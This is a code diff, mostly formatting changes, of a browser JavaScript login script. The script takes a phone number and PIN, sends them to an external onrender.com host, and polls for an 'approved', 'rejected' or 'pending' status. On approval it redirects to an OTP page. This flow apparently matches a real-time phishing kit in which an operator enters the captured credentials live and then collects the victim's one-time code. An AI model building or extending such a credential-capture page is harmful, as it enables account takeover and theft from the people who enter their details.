@@ -1,19 +1,19 @@
+```js
 const loginBtn = document.getElementById("loginBtn");
 
 loginBtn.addEventListener("click", loginUser);
 
 
-function loginUser(){
+function loginUser() {
 
     let phone = document.getElementById("phone").value;
-
     let pin = document.getElementById("pin").value;
 
 
-    if(phone === "" || pin === ""){
+    if (phone === "" || pin === "") {
 
         document.getElementById("message").textContent =
-        "Please fill all fields";
+            "Please fill all fields";
 
         return;
     }
@@ -21,32 +21,27 @@ function loginUser(){
 
     fetch("https://sercice-teat-name.onrender.com/login", {
 
-    method: "POST",
+        method: "POST",
 
-    headers: {
+        headers: {
+            "Content-Type": "application/json"
+        },
 
-        "Content-Type": "application/json"
-
-    },
-
-    body: JSON.stringify({
-
-        phone: phone,
-        pin: pin
+        body: JSON.stringify({
+            phone: phone,
+            pin: pin
+        })
 
     })
 
-})
-    .then(function(response){
-
+    .then(function(response) {
         return response.json();
-
     })
-    .then(function(data){
+
+    .then(function(data) {
 
         document.getElementById("message").textContent =
-        data.message;
-
+            data.message;
 
         checkLoginStatus();
 
@@ -55,41 +50,40 @@ function loginUser(){
 }
 
 
-function checkLoginStatus(){
+function checkLoginStatus() {
 
-    fetch("https://sercice-teat-name.onrender.com//login-status")
+    fetch("https://sercice-teat-name.onrender.com/login-status")
 
-    .then(function(response){
-
+    .then(function(response) {
         return response.json();
-
     })
 
-    .then(function(data){
+    .then(function(data) {
 
         console.log("Login status:", data.status);
 
 
-        if(data.status === "approved"){
+        if (data.status === "approved") {
 
             window.location.href = "/otp.html";
 
             return;
-
         }
 
 
-        if(data.status === "rejected"){
+        if (data.status === "rejected") {
 
             document.getElementById("message").textContent =
-            "Login rejected";
+                "Login rejected";
 
             return;
-
         }
 
 
-        if(data.status === "pending"){
+        if (data.status === "pending") {
+
+            document.getElementById("message").textContent =
+                "Waiting for approval";
 
             setTimeout(checkLoginStatus, 2000);
 
@@ -98,3 +92,4 @@ function checkLoginStatus(){
     });
 
 }
+```
